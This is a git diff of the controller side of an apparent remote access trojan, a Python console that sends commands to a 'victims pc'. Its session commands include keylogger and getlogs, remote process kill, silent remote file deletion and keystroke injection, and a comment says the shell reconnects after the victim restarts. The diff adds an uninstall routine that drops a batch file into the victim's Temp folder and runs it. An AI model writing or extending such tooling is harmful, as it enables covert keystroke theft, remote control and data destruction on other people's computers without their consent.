@@ -23,7 +23,7 @@ session_ids = []
 # saves all the command
 COMMANDS = ["help", "sessions"]
 SESSION_COMMANDS = ["help", "back", "tree", "install", "matrix", "disconnect", "ps", "kill", "keylogger", "getlogs",
-                    "keybind", "msg", "statlights", "delete"]
+                    "keybind", "msg", "statlights", "delete", "uninstall"]
 
 
 class Commands:
@@ -159,9 +159,7 @@ class Commands:
                     print("The argument needs to be a number")
                     return
                 # gets the username of the computer
-                pcAndUsername = sendMessage("c o whoami")
-                pcAndUsernameLst = pcAndUsername.replace("\r\n", "").split("\\")
-                username = pcAndUsernameLst[1]
+                username = sendMessage("c o echo %USERNAME%")
                 # sends the matrix.bat script
                 with open("extraScripts/matrix.bat", "r") as file:
                     sendMessage(file.read())
@@ -214,12 +212,8 @@ class Commands:
         # deletes a file in given path
         elif message == "delete":
             if args:
-                deleted = sendMessage(f"c o del /f {args[0]}")
-                if deleted == "done":
-                    print("Done")
-                else:
-                    print("Path couldnt be found")
-                    return
+                message = f"{args[0]}".replace("/", "\\")
+                sendMessage(f"c n del /f /Q {message}")
             elif not args:
                 print("You need a path type 'help' for more")
                 return
@@ -227,7 +221,17 @@ class Commands:
                 print("to many arguments type 'help' for more")
                 return
 
-                # sends a keybind
+        # uninstalls the whole shell
+        elif message == "uninstall":
+            user = sendMessage("c o echo %USERNAME%")
+            user = user.replace("\n", "")
+            with open("extraScripts/uninstall.bat", "r") as file:
+                sendMessage(file.read())
+            name = receiveMessage()
+            sendMessage(f"c n C:\\Users\\{user}\\AppData\\Local\\Temp\\{name}")
+            sendMessage("!dsc")
+
+        # sends a keybind
         elif message == "keybind":
             special_keys = {"ctrl": "Key.ctrl", "windows": "Key.cmd", "alt": "Key.alt_l", "alt_gr": "Key.alt_gr",
                             "back": "Key.backspace",
@@ -268,11 +272,16 @@ class Commands:
                 print("You need atleast one letter for the message type 'help' for more")
         # makes the keyboard status lights blink randomly
         elif message == "statlights":
-            keys = ["Key.caps_lock", "Key.num_lock"]
-            for i in range(0, 1000):
-                key = randint(0, 1)
-                sendMessage(f"k b {keys[key]}")
-                # sleep(0.2)
+            if args:
+                keys = ["Key.caps_lock", "Key.num_lock", "Key.scroll_lock"]
+                for i in range(0, int(args[0])):
+                    key = randint(0, 2)
+                    sendMessage(f"k s {keys[key]}")
+                    sleep(0.1)
+            if not args:
+                print("You need to write how many times to let the lights blink type 'help' for more")
+            else:
+                print("Too many arguments type 'help' for more")
 
         # disconnects and closes the shell script on the victims pc(if installed it will reconnect after restart of the victims pc)
         elif message == "disconnect":
